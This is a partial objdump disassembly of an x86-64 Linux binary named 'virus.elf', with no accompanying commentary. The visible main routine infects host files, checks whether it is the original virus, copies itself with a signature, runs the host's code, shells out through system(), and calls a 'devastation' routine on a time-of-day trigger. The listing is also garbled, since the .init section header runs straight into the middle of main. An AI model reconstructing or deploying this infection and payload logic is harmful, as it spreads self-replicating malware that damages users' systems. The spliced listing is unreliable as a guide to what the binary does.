
virus.elf:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 <_init>:
    1000:	f3 0f 1e fa          	endbr64 
    2582:	48 89 d7             	mov    rdi,rdx
    2585:	f2 ae                	repnz scas al,BYTE PTR es:[rdi]
    2587:	48 89 c8             	mov    rax,rcx
    258a:	48 f7 d0             	not    rax
    258d:	48 8d 50 ff          	lea    rdx,[rax-0x1]
    2591:	48 8d 85 f0 fb ff ff 	lea    rax,[rbp-0x410]
    2598:	48 01 d0             	add    rax,rdx
    259b:	48 be 3e 3e 20 2f 68 	movabs rsi,0x656d6f682f203e3e
    25a2:	6f 6d 65 
    25a5:	48 bf 2f 75 62 75 6e 	movabs rdi,0x2f75746e7562752f
    25ac:	74 75 2f 
    25af:	48 89 30             	mov    QWORD PTR [rax],rsi
    25b2:	48 89 78 08          	mov    QWORD PTR [rax+0x8],rdi
    25b6:	48 be 44 65 73 6b 74 	movabs rsi,0x2f706f746b736544
    25bd:	6f 70 2f 
    25c0:	48 bf 73 65 6c 65 63 	movabs rdi,0x64657463656c6573
    25c7:	74 65 64 
    25ca:	48 89 70 10          	mov    QWORD PTR [rax+0x10],rsi
    25ce:	48 89 78 18          	mov    QWORD PTR [rax+0x18],rdi
    25d2:	48 b9 48 6f 73 74 66 	movabs rcx,0x656c696674736f48
    25d9:	69 6c 65 
    25dc:	48 89 48 20          	mov    QWORD PTR [rax+0x20],rcx
    25e0:	c7 40 28 2e 74 78 74 	mov    DWORD PTR [rax+0x28],0x7478742e
    25e7:	c6 40 2c 00          	mov    BYTE PTR [rax+0x2c],0x0
    25eb:	48 8d 85 f0 fb ff ff 	lea    rax,[rbp-0x410]
    25f2:	48 89 c7             	mov    rdi,rax
    25f5:	e8 36 ed ff ff       	call   1330 <system@plt>
    25fa:	8b 95 4c f7 ff ff    	mov    edx,DWORD PTR [rbp-0x8b4]
    2600:	48 8d 85 f0 f7 ff ff 	lea    rax,[rbp-0x810]
    2607:	89 d6                	mov    esi,edx
    2609:	48 89 c7             	mov    rdi,rax
    260c:	e8 c4 f8 ff ff       	call   1ed5 <infectHostFile>
    2611:	8b 85 4c f7 ff ff    	mov    eax,DWORD PTR [rbp-0x8b4]
    2617:	89 c7                	mov    edi,eax
    2619:	e8 25 f7 ff ff       	call   1d43 <isOriginalVirus>
    261e:	84 c0                	test   al,al
    2620:	74 30                	je     2652 <main+0x201>
    2622:	48 8b 85 30 f7 ff ff 	mov    rax,QWORD PTR [rbp-0x8d0]
    2629:	48 8b 00             	mov    rax,QWORD PTR [rax]
    262c:	48 89 c7             	mov    rdi,rax
    262f:	e8 9a fb ff ff       	call   21ce <makeCopyAndAddSignature>
    2634:	48 8d 3d 23 0a 00 00 	lea    rdi,[rip+0xa23]        # 305e <_IO_stdin_used+0x5e>
    263b:	e8 90 ec ff ff       	call   12d0 <puts@plt>
    2640:	8b 85 4c f7 ff ff    	mov    eax,DWORD PTR [rbp-0x8b4]
    2646:	89 c7                	mov    edi,eax
    2648:	e8 23 ed ff ff       	call   1370 <close@plt>
    264d:	e9 a1 00 00 00       	jmp    26f3 <main+0x2a2>
    2652:	48 8b 85 90 f7 ff ff 	mov    rax,QWORD PTR [rbp-0x870]
    2659:	89 c7                	mov    edi,eax
    265b:	8b b5 78 f7 ff ff    	mov    esi,DWORD PTR [rbp-0x888]
    2661:	48 8b 95 30 f7 ff ff 	mov    rdx,QWORD PTR [rbp-0x8d0]
    2668:	8b 85 4c f7 ff ff    	mov    eax,DWORD PTR [rbp-0x8b4]
    266e:	48 89 d1             	mov    rcx,rdx
    2671:	89 fa                	mov    edx,edi
    2673:	89 c7                	mov    edi,eax
    2675:	e8 77 f9 ff ff       	call   1ff1 <executeHostPart>
    267a:	8b 85 4c f7 ff ff    	mov    eax,DWORD PTR [rbp-0x8b4]
    2680:	89 c7                	mov    edi,eax
    2682:	e8 e9 ec ff ff       	call   1370 <close@plt>
    2687:	bf 00 00 00 00       	mov    edi,0x0
    268c:	e8 3f ed ff ff       	call   13d0 <time@plt>
    2691:	48 89 85 50 f7 ff ff 	mov    QWORD PTR [rbp-0x8b0],rax
    2698:	48 8d 85 50 f7 ff ff 	lea    rax,[rbp-0x8b0]
    269f:	48 89 c7             	mov    rdi,rax
    26a2:	e8 e9 eb ff ff       	call   1290 <localtime@plt>
    26a7:	48 89 85 58 f7 ff ff 	mov    QWORD PTR [rbp-0x8a8],rax
    26ae:	48 8b 85 58 f7 ff ff 	mov    rax,QWORD PTR [rbp-0x8a8]
    26b5:	8b 40 08             	mov    eax,DWORD PTR [rax+0x8]
    26b8:	83 f8 10             	cmp    eax,0x10
    26bb:	75 36                	jne    26f3 <main+0x2a2>
    26bd:	48 8b 85 58 f7 ff ff 	mov    rax,QWORD PTR [rbp-0x8a8]
    26c4:	8b 40 04             	mov    eax,DWORD PTR [rax+0x4]
    26c7:	83 e8 36             	sub    eax,0x36
    26ca:	83 f8 f6             	cmp    eax,0xfffffff6
    26cd:	7c 24                	jl     26f3 <main+0x2a2>
    26cf:	48 8b 85 58 f7 ff ff 	mov    rax,QWORD PTR [rbp-0x8a8]
    26d6:	8b 40 04             	mov    eax,DWORD PTR [rax+0x4]
    26d9:	83 e8 36             	sub    eax,0x36
    26dc:	83 f8 0a             	cmp    eax,0xa
    26df:	7f 12                	jg     26f3 <main+0x2a2>
    26e1:	48 8b 85 30 f7 ff ff 	mov    rax,QWORD PTR [rbp-0x8d0]
    26e8:	48 8b 00             	mov    rax,QWORD PTR [rax]
    26eb:	48 89 c7             	mov    rdi,rax
    26ee:	e8 1f ef ff ff       	call   1612 <devastation>
    26f3:	90                   	nop
    26f4:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    26f8:	64 48 33 04 25 28 00 	xor    rax,QWORD PTR fs:0x28
    26ff:	00 00 
    2701:	74 05                	je     2708 <main+0x2b7>
    2703:	e8 f8 eb ff ff       	call   1300 <__stack_chk_fail@plt>
    2708:	c9                   	leave  
    2709:	c3                   	ret    
    270a:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]

0000000000002710 <__libc_csu_init>:
    2710:	f3 0f 1e fa          	endbr64 
    2714:	41 57                	push   r15
    2716:	4c 8d 3d 7b 25 00 00 	lea    r15,[rip+0x257b]        # 4c98 <__frame_dummy_init_array_entry>
    271d:	41 56                	push   r14
    271f:	49 89 d6             	mov    r14,rdx
    2722:	41 55                	push   r13
    2724:	49 89 f5             	mov    r13,rsi
    2727:	41 54                	push   r12
    2729:	41 89 fc             	mov    r12d,edi
    272c:	55                   	push   rbp
    272d:	48 8d 2d 6c 25 00 00 	lea    rbp,[rip+0x256c]        # 4ca0 <__do_global_dtors_aux_fini_array_entry>
    2734:	53                   	push   rbx
    2735:	4c 29 fd             	sub    rbp,r15
    2738:	48 83 ec 08          	sub    rsp,0x8
    273c:	e8 bf e8 ff ff       	call   1000 <_init>
    2741:	48 c1 fd 03          	sar    rbp,0x3
    2745:	74 1f                	je     2766 <__libc_csu_init+0x56>
    2747:	31 db                	xor    ebx,ebx
    2749:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
    2750:	4c 89 f2             	mov    rdx,r14
    2753:	4c 89 ee             	mov    rsi,r13
    2756:	44 89 e7             	mov    edi,r12d
    2759:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]
    275d:	48 83 c3 01          	add    rbx,0x1
    2761:	48 39 dd             	cmp    rbp,rbx
    2764:	75 ea                	jne    2750 <__libc_csu_init+0x40>
    2766:	48 83 c4 08          	add    rsp,0x8
    276a:	5b                   	pop    rbx
    276b:	5d                   	pop    rbp
    276c:	41 5c                	pop    r12
    276e:	41 5d                	pop    r13
    2770:	41 5e                	pop    r14
    2772:	41 5f                	pop    r15
    2774:	c3                   	ret    
    2775:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
    277c:	00 00 00 00 

0000000000002780 <__libc_csu_fini>:
    2780:	f3 0f 1e fa          	endbr64 
    2784:	c3                   	ret    
    2785:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
    278c:	00 00 00 
    278f:	90                   	nop

0000000000002790 <__stat>:
    2790:	f3 0f 1e fa          	endbr64 
    2794:	48 89 f2             	mov    rdx,rsi
    2797:	48 89 fe             	mov    rsi,rdi
    279a:	bf 01 00 00 00       	mov    edi,0x1
    279f:	e9 3c ec ff ff       	jmp    13e0 <__xstat@plt>
    27a4:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
    27ab:	00 00 00 
    27ae:	66 90                	xchg   ax,ax

00000000000027b0 <__fstat>:
    27b0:	f3 0f 1e fa          	endbr64 
    27b4:	48 89 f2             	mov    rdx,rsi
    27b7:	89 fe                	mov    esi,edi
    27b9:	bf 01 00 00 00       	mov    edi,0x1
    27be:	e9 3d ec ff ff       	jmp    1400 <__fxstat@plt>

Disassembly of section .fini:

00000000000027c4 <_fini>:
    27c4:	f3 0f 1e fa          	endbr64 
    27c8:	48 83 ec 08          	sub    rsp,0x8
    27cc:	48 83 c4 08          	add    rsp,0x8
    27d0:	c3                   	ret    
